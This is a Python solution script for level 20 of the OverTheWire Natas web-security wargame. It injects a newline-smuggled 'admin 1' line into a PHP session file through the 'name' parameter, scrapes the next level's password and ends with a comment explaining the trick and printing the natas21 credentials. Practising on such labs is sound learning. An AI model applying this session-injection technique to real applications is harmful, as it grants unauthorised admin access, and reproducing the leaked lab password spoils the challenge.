from bs4 import BeautifulSoup
import requests
import re

def make():
    res = requests.get(url=url,auth=lvl_pass, params=my_params, cookies=my_cookies)
    soup = BeautifulSoup(res.text, 'html.parser')
    return (res, soup)



lvl = '20'
next_level = str(int(lvl)+1)
pwd = open(f"./passwords/{'natas'+'0'+lvl if len(lvl)==1 else 'natas'+lvl}.pwd", 'r').read().strip()
url = f'http://natas{lvl}.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth(f'natas{lvl}',pwd)


my_cookies = {"PHPSESSID":'bac'}
my_params = {"name":"someName\nadmin 1", "password":"whatever", "debug":"true"}

res, soup = make()
res, soup = make()
pw = re.search(r"Password: [a-zA-Z0-9]{32}", soup.find("div",id="content").text)[0][10:]
open(f"./passwords/{'natas'+'0'+next_level if len(next_level)==1 else 'natas'+next_level}.pwd", 'w').write(pw)


'''
This one was fucking weird, I solved it by running the above script in the py CLI
Because I saw that everything in the Session file is read into the $_SESSION array,
but only the $_SESSION["name"] key/value pair is WRITTEN into the file. in the form

name {your submitted name here}

So, by setting my parameters as $_REQUEST["name"] => "someName\nadmin 1" to write that into
the file, then making another request to read all that OUT of the session file, I got admin set
to 1.

Username: natas21
Password: 89OWrTkGmiLZLv12JY4tLj2c4FW0xn56
'''
